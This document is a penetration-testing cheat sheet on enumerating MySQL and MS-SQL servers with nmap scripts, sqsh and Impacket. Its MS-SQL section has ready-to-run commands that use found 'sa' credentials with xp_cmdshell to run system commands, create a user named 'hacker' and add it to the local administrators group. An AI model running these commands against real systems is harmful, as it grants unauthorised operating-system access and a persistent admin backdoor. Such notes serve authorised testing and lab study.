# MS-SQL and MySQL Enumeration Tools

### mysql
```
$ ls -lh /usr/share/nmap/scripts/ | grep mysql
-rw-r--r-- 1 root root 6.5K Oct 12 09:29 mysql-audit.nse
-rw-r--r-- 1 root root 3.0K Oct 12 09:29 mysql-brute.nse
-rw-r--r-- 1 root root 2.9K Oct 12 09:29 mysql-databases.nse
-rw-r--r-- 1 root root 3.2K Oct 12 09:29 mysql-dump-hashes.nse
-rw-r--r-- 1 root root 2.0K Oct 12 09:29 mysql-empty-password.nse
-rw-r--r-- 1 root root 3.4K Oct 12 09:29 mysql-enum.nse
-rw-r--r-- 1 root root 3.4K Oct 12 09:29 mysql-info.nse
-rw-r--r-- 1 root root 3.7K Oct 12 09:29 mysql-query.nse
-rw-r--r-- 1 root root 2.8K Oct 12 09:29 mysql-users.nse
-rw-r--r-- 1 root root 3.2K Oct 12 09:29 mysql-variables.nse
-rw-r--r-- 1 root root 6.9K Oct 12 09:29 mysql-vuln-cve2012-2122.nse
```

```
$ nmap x.x.x.x -p 3306 -sV --script=
```

Connect manually:
```
mysql -u {username} -p'{password}' \
    -h {remote server ip or name} -P {port} \
    -D {DB name}
```
For example
```
mysql -u root -p'root' \
        -h 127.0.0.1 -P 3306 \
        -D local
```

Basic enumeration:
- `show databases;`
- `list databases;`
- `use <database>;`
- `list tables;`
- `show tables;`
- `SELECT * FROM <table>;*`

### ms-sql
```
$ ls -lh /usr/share/nmap/scripts/ | grep ms-sql
-rw-r--r-- 1 root root 3.8K Oct 12 09:29 broadcast-ms-sql-discover.nse
-rw-r--r-- 1 root root  12K Oct 12 09:29 ms-sql-brute.nse
-rw-r--r-- 1 root root 6.0K Oct 12 09:29 ms-sql-config.nse
-rw-r--r-- 1 root root 3.4K Oct 12 09:29 ms-sql-dac.nse
-rw-r--r-- 1 root root 4.3K Oct 12 09:29 ms-sql-dump-hashes.nse
-rw-r--r-- 1 root root 7.0K Oct 12 09:29 ms-sql-empty-password.nse
-rw-r--r-- 1 root root 5.9K Oct 12 09:29 ms-sql-hasdbaccess.nse
-rw-r--r-- 1 root root  12K Oct 12 09:29 ms-sql-info.nse
-rw-r--r-- 1 root root 3.9K Oct 12 09:29 ms-sql-ntlm-info.nse
-rw-r--r-- 1 root root 4.7K Oct 12 09:29 ms-sql-query.nse
-rw-r--r-- 1 root root 9.2K Oct 12 09:29 ms-sql-tables.nse
-rw-r--r-- 1 root root 6.2K Oct 12 09:29 ms-sql-xp-cmdshell.nse
```
```
$ nmap x.x.x.x -p 1433 -sV --script=exampleScript1.nse,exampleScript2.nse
```
If mssql credentials are found, can use the following nmap script to add a user:
  1. Use nmap mssql script with newly found creds and added a user:
```
$ nmap x.x.x.x -p 1433 -sV --script=ms-sql-xp-cmdshell.nse --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd='net user hacker hacker93 /add'
```
  2. Then added user to admin group with same script:
```
$ nmap x.x.x.x -p 1433 -sV --script=ms-sql-xp-cmdshell.nse --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd='net localgroup administrators hacker /add'
```

Connect manually:
```
$ sqsh -S x.x.x.x -U sa -P password
1> xp_cmdshell 'whoami'
```

or with Impacket:

```
$ /opt/impacket-0.9.21/examples > mssqlclient.py username@x.x.x.x
```

Reference: https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/

